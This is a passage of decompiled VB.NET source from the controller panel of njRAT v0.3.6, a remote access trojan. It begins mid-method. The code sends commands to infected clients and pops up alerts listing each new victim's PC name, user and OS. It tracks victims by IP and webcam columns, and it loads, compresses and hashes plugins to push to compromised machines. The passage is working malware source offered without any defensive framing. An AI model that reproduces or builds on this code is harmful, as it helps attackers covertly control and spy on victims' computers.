                        NewLateBinding.LateCall(current.Tag, Nothing, "Send", objArray3, Nothing, Nothing, copyBack, True)
                        If copyBack(0) Then
                            NewLateBinding.LateIndexSetComplex(O, New Object() {num, RuntimeHelpers.GetObjectValue(objArray3(0))}, Nothing, True, False)
                        End If
                        current.ForeColor = DirectCast(NewLateBinding.LateIndexGet(O, New Object() {2}, Nothing), Color)
                    Loop
                Finally
                    If TypeOf enumerator Is IDisposable Then
                        TryCast(enumerator, IDisposable).Dispose()
                    End If
                End Try
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError()
            End Try
        End Sub

        Public Shared Sub shw(ByVal c As Client)
            Dim alrt As New alrt
            alrt.Label1.Text = c.L.Text
            alrt.PictureBox1.Image = ind.F.IMG2.Images.Item((c.L.SubItems.Item(ind.hco).Text & ".png"))
            alrt.L1.Items.Add("PC").SubItems.Add(c.L.SubItems.Item(ind.hpc).Text)
            alrt.L1.Items.Add("Usr").SubItems.Add(c.L.SubItems.Item(ind.huser).Text)
            alrt.L1.Items.Add("OS").SubItems.Add(c.L.SubItems.Item(ind.hos).Text)
            alrt.L1.View = System.Windows.Forms.View.Details
            alrt.PictureBox1.SizeMode = PictureBoxSizeMode.Normal
            alrt.L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
            alrt.TopMost = False
            alrt.Visible = False
            FN.ShowWindow(alrt.Handle, 8)
            alrt.shw()
        End Sub

        Public Shared Function vno(ByVal l As ListViewItem) As Object
            Dim obj2 As Object
            Try
                obj2 = String.Concat(New String() {l.Text, "/", l.SubItems.Item(ind.hip).Text, "/", l.SubItems.Item(ind.hpc).Text, "/", l.SubItems.Item(ind.huser).Text})
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                obj2 = "?"
                ProjectData.ClearProjectError()
            End Try
            Return obj2
        End Function


        ' Fields
        Public Shared elt As List(Of alrt) = New List(Of alrt)
        Public Shared F As Form1
        Public Shared hac As Integer = 10
        Public Shared hcam As Integer = 7
        Public Shared hco As Integer = 5
        Public Shared hin As Integer = 4
        Public Shared hip As Integer = 1
        Public Shared hname As Integer = 0
        Public Shared hos As Integer = 6
        Public Shared hpc As Integer = 2
        Public Shared hping As Integer = 9
        Public Shared huser As Integer = 3
        Public Shared hvr As Integer = 8
        Public Shared LG As List(Of String) = New List(Of String)
        Public Shared Plug As List(Of plg) = New List(Of plg)
        Public Shared RC As Integer = 0
        Public Shared SNT As Integer = 0
        Public Shared vr As String = "njRAT v0.3.6"
        Public Shared W As SK
        Public Shared Y As String = "|'|'|"

        ' Nested Types
        Public Delegate Sub _Req(ByVal obj As Object)

        Public Delegate Sub _shw(ByVal c As Client)

        Public Class plg
            ' Methods
            Public Sub New(ByVal fn As String)
                Dim cM As Boolean = True
                Me.B = ZIP(File.ReadAllBytes((Application.StartupPath & "\plugin\" & fn)), cM)
                Me.Name = fn
                Me.Hash = getMD5Hash(Me.B)
            End Sub
            Public Shared Function getMD5Hash(ByVal B As Byte()) As String
                B = New MD5CryptoServiceProvider().ComputeHash(B)
                Dim str2 As String = ""
                Dim num As Byte
                For Each num In B
                    str2 = (str2 & num.ToString("x2"))
                Next
                Return str2
            End Function

            Public Shared Function ZIP(ByVal B As Byte(), ByRef CM As Boolean) As Byte()
                If CM Then
                    Dim stream2 As New MemoryStream
                    Dim stream As New GZipStream(stream2, CompressionMode.Compress, True)
                    stream.Write(B, 0, B.Length)
                    stream.Dispose()
                    stream2.Position = 0
                    Dim buffer2 As Byte() = New Byte((CInt(stream2.Length) + 1) - 1) {}
                    stream2.Read(buffer2, 0, buffer2.Length)
                    stream2.Dispose()
                    Return buffer2
                End If
                Dim stream4 As New MemoryStream(B)
                Dim stream3 As New GZipStream(stream4, CompressionMode.Decompress)
                Dim buffer As Byte() = New Byte(4 - 1) {}
                stream4.Position = (stream4.Length - 5)
                stream4.Read(buffer, 0, 4)
                Dim count As Integer = BitConverter.ToInt32(buffer, 0)
                stream4.Position = 0
                Dim array As Byte() = New Byte(((count - 1) + 1) - 1) {}
                stream3.Read(array, 0, count)
                stream3.Dispose()
                stream4.Dispose()
                Return array
            End Function

            ' Fields
            Public B As Byte()
            Public Hash As String
            Public Name As String
        End Class
    End Class
End Namespace


